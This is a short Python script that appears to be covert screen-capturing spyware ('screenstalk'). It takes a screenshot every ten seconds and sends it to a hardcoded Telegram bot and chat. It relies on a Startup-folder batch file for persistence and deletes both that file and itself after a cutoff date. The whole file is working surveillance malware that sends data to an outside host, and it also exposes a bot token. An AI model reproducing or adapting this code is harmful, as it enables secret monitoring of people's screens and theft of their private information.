import telebot;
from telebot import types;
import time;
from screenshot import get_screenshots_bytes
import datetime;
import os;
import getpass
import shutil
from sys import argv


bot = telebot.TeleBot("6182954429:AAFhs3NF6Diynl2lFBzNvJGpwtTd9GGshMs")
chatid = -849718605
USER_NAME = getpass.getuser()
def screengrab():
  if datetime.datetime.now() >= datetime.datetime(2023, 6, 16):
    print('deleted')
    startup_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\screenstalk.bat' % USER_NAME
    os.remove(startup_path)
    if not argv[0].endswith(".py"):
      os.remove(argv[0])
    exit()
  else:
    try:
        print("screenshot sended")
        png = get_screenshots_bytes()
        bot.send_photo(chatid, png)
        time.sleep(10)
        screengrab()
    except Exception as e:
        print(e)
        time.sleep(60)
        screengrab() 
        
screengrab()
